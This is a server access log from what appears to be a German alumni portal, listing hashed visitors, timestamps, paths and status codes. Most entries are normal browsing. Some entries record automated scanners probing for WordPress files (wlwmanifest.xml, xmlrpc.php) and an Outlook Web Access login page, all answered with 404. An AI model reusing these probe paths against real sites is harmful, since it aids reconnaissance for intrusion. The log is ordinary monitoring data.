user;timestamp;referer;target;method;status
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:19:25;/profile/chat;/profile/chat/563M5WMSYW9M/read;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:19:31;/profile/chat/563M5WMSYW9M/read;/profile/chat;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:19:43;/profile/chat;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:13;/profile;/profile/image/update;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:28;/profile/image/update;/profile/update;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:30;/profile/update;/profile/image/update;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:30;/profile/image/update;/profile/update;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:32;/profile/update;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:36;/profile;/profile/settings;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:38;/profile/settings;/profile/settings/newsletter;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:40;/profile/settings/newsletter;/profile/settings;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:41;/profile/settings;/profile/settings/privacy;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:51;/profile/settings/privacy;/profile/settings;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:53;/profile/settings;/profile/settings/password;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:55;/profile/settings/password;/profile/settings;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:56;/profile/settings;/profile/settings/email;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:20:59;/profile/settings/email;/profile/settings;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:21:01;/profile/settings;/profile/settings/person;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:21:03;/profile/settings/person;/profile/settings;GET;200
d443d894f48565f31b8185855cb137b806483104dcb2d4df7edd27c3453fbf48;2025-11-09 08:21:33;;/aktuelles/stellenangebote;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:21:43;/profile/settings;/profile/update;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:22:26;/profile/update;/profile;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:22:31;/profile;/profile/schule;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:22:32;/profile/schule;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:22:35;/;/aktuelles/stellenangebote;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:22:40;/aktuelles/stellenangebote;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:22:44;/;/veranstaltungen;GET;200
1943838ad3d1cf08f3e15ebe6652308ef14c79817fbb78124dffdb6e148e04b6;2025-11-09 08:22:49;;/personen/alumni/schule/68457;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:23:02;/veranstaltungen;/;GET;200
f15714e00cb803c16785c9df4088b3bc18273773a206b1cbd10cfb9dc3738481;2025-11-09 08:23:05;/;/personen;GET;200
0bb7229768e32022ca39f8cac046477b06e7146ca41b1cf083738d50f580027c;2025-11-09 08:26:36;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
44098344805b82343813bd6246fa89ecf0d5446c1cd097ff2cd8bba3ab2bd8d0;2025-11-09 08:26:36;;/personen/alumni/details/benjamin-wagner;GET;200
44098344805b82343813bd6246fa89ecf0d5446c1cd097ff2cd8bba3ab2bd8d0;2025-11-09 08:26:56;;/;GET;200
aab039f44b4911d0d62708ecfddde561937dfb5cb2cc263ecc2620d91b320764;2025-11-09 08:27:27;;/personen/alumni/details/benjamin-wagner;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:30;;/;GET;200
f53570707fd07385d9e4ca66f28e1acd9b0cd67a9bc46453c26d62516acc2753;2025-11-09 08:27:33;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:37;;/personen/alumni/schule/59013;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:38;;/personen/alumni/schule/600027;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:41;;/personen/alumni/schule/MP004;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:43;;/gruppen/hobby/philosophie;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:43;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:45;;/gruppen/hobby/theater-und-schauspiel;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:45;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:46;;/themen/details/abschied-aus-moabit;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:52;;/gruppen/hobby/literaturanalyse;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:53;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:27:58;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:01;;/gruppen/hobby/social-media-management;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:01;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:03;;/gruppen/hobby/politik-und-debatten;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:04;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:05;;/gruppen/hobby/grafikdesign;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:06;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:07;;/gruppen/hobby/gartnern;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:07;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:12;;/gruppen/hobby/abschlussfest;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:12;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:14;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:14;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:16;;/gruppen/hobby/statistik;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:16;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:17;;/gruppen/hobby/malen-und-zeichnen;GET;302
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:18;;/gruppen;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-09 08:28:19;;/themen?category=politik;GET;200
e4223be64f6dfca6cf8cb59b6a678a27885dd6c9563f594abc0404922b166aca;2025-11-09 08:29:05;;/;GET;200
323e399119e6eaa2b4628da87c424b672392b7404c05927c44efc28e18d63d24;2025-11-09 08:30:38;;/gruppen/hobby/malen-und-zeichnen;GET;302
634c1287ca420124a4c4add47c250fdb87889b612005704d330a8b4529a78cf8;2025-11-09 08:30:45;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
1c0fababa81110b8ad5f3482a7b45716d5f6b94c607269ef085240b653d38aca;2025-11-09 08:38:05;;/gruppen/hobby/sozialwissenschaften;GET;302
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-09 08:41:37;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:24;;//wp-includes/ID3/license.txt;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//feed/;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//xmlrpc.php?rsd;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//blog/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//web/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//wp/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//2020/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//2019/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//2021/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//shop/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//wp1/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//test/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//site/wp-includes/wlwmanifest.xml;GET;404
2aa18646b1ffaa894c891e0e28a1d5e3b7799e0a56335e0dac2beace9497a77b;2025-11-09 08:42:25;;//cms/wp-includes/wlwmanifest.xml;GET;404
d431cb7ba8d21af206348ca2bf25903d7f66c1723d25d3abcaa8b3a0f25cb0b4;2025-11-09 08:45:03;;/owa/auth/logon.aspx;GET;404
7fc14d49b868fcd06280763882580a0696ba7d7a1172cfe84d6da2a7d8b6ebb8;2025-11-09 08:45:52;;/gruppen/hobby/fotografie;GET;302
7bc0d7bc22c07a7f4e8f50c705e63378bf46c942095d05a146be4f12621b0de2;2025-11-09 08:46:12;;/;GET;200
b3a04d2cdb31b5fdcc1ced32ea0f3e1232acd42d7578bb03b22d26569da0b30d;2025-11-09 08:46:36;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-09 08:50:19;;/personen/alumni/schule/5504;GET;200
b583f5240efc763df6910f68147075e22f2dd9112ee0a368121344ff0ebfa873;2025-11-09 08:53:20;;/personen/alumni/details/lisa-stache;GET;200
e8f7c5a2012787248393ce8c44d56f25c267eb1eb4bde51b8f08860ed148ed71;2025-11-09 09:01:02;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
b0fc28113fdbcf0183228024aab4f110dd053ea89d7f378ffdb730a1a7c0ad8b;2025-11-09 09:01:17;;/gruppen/hobby/astronomie;GET;302
4980c076e94a7afaf646feb233269a979b3703217ffe118e6a65403509724d74;2025-11-09 09:05:53;;/;GET;200
5787a7e200aef57247f64ba78a6da88f6398aef64f46d61dce48ed8c793239f6;2025-11-09 09:09:10;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
f4854f7ad1a7990b611853799b7e3e72d2c323a2e86caf2f2c44522fd774e717;2025-11-09 09:14:01;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
f1d703b34a8ed0e4617647ae2199f6c63cbba375932df689ac9813b79c96e547;2025-11-09 09:15:28;;/;GET;200
b5712c168a77aa8ade1084237e92fe295197838ec3a60be75e5b326e8f900158;2025-11-09 09:17:00;;/gruppen/hobby/philosophie;GET;302
c28beb1777107a5e6af24b0309e77d2fd06bb30a3da9d581e8df417094ba391f;2025-11-09 09:18:33;;/;GET;200
c28beb1777107a5e6af24b0309e77d2fd06bb30a3da9d581e8df417094ba391f;2025-11-09 09:18:45;;/wiki;GET;404
43caa434db301144c9cfffdca5d56ae5eb358752518f69119424c7895f81559c;2025-11-09 09:19:58;;/;GET;200
e4f710eb78adaaa1cc9f3d78302e55a3b956bef59d946645df059b539eebfc1d;2025-11-09 09:20:12;;/;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:39;;/;GET;200
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/assets/controllers/form-collection_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:55;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:20:57;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:46;;//code.jquery.com/jquery-3.6.0.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:46;;/assets/app/core.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:46;;//ga.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:46;;//cdn.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:46;;//cdnjs.cloudflare.com/ajax/libs/emojionearea/3.4.2/emojionearea.min.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:46;;/turbo/turbo.index-810f44ef1a202a441e4866b7a4c72d11.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/stimulus-bundle/controllers.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/core/core.index-644d3145fb9a988a73db5b102874629c.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/stimulus-bundle/loader-763a9e2ea6bbeffec5de3eee8492b6ac.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/assets/controllers/hello_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/assets/app/form.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/ux-turbo/turbo_controller.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/dist/es-module-shims.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/stimulus-bundle/controllers-bf740395fc052734f78f2c295c04f989.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/ux-turbo/turbo_controller-ce5e32dafdec0b7752f02e3e2cb25751.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/stimulus/stimulus.index-a141b105386da8c0722a2f8c16eabbbe.js;GET;404
41360eb5592655470fca985e49be91fa763f82ee6b4c79e3dddb05145615d8c8;2025-11-09 09:21:47;;/assets/controllers/form-collection_controller.js;GET;404
cf12f3a5540c654a18d45605171815457433ad2b4b56b82243947119a2a3bd6c;2025-11-09 09:22:07;;/aktuelles/stellenangebote;GET;200
0b92832033f75cbc4987894d09bd4095c55570fd5403a3497772a15fc9da791a;2025-11-09 09:24:31;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
4c3eafc0b5878e99b2e9e81731f8c7f039074fe6aedfb6c1d64a069a69af235f;2025-11-09 09:28:29;;/;GET;200
abd2eb9ecd32571b423cbd3df8c9d4d4c0201dcd943854d3c48c6273fbd0a343;2025-11-09 09:31:30;;/themen/details/abschied-aus-moabit;GET;200
72dad59626765edf7a9ad9662103bf824f504daf35c8988b9e55b2dbc1ffdb91;2025-11-09 09:32:32;;/gruppen/hobby/robotik;GET;302
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-09 09:35:41;/;/;GET;200
56c72a47671baaece47795a8d43ef4e22982bfbae3d965d196dff42d583fabe0;2025-11-09 09:40:30;;/gruppen/plausch/ai-driven-programme;GET;302
dff02c98e5082040ee55831bf19ae7ba14ec994fc75a9291b84bd742ae493388;2025-11-09 09:42:26;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:10;;/;GET;200
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:11;;//wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:11;;//xmlrpc.php?rsd;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:12;;/;GET;200
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:12;;//blog/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:12;;//web/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:13;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:14;;//website/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:14;;//wp/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:14;;//news/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:15;;//2018/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:15;;//2019/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:15;;//shop/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:16;;//wp1/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:17;;//test/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:17;;//media/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:17;;//wp2/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:18;;//site/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:18;;//cms/wp-includes/wlwmanifest.xml;GET;404
7435475f0e3f40c826f7b9c9d75241d8cc90d8462a15f3f01ec9d485595bf3cd;2025-11-09 09:49:19;;//sito/wp-includes/wlwmanifest.xml;GET;404
a90af479bd045b3f0e04d85f562a143e716d3a6432a40d24e753da352ee244c2;2025-11-09 09:51:02;;/;GET;200
f633efd30aae4d38f5e216495f5de4d661f7da480a0881e386fa2f6677a82633;2025-11-09 09:51:37;;/personen/alumni/details/heidi-burghard;GET;200
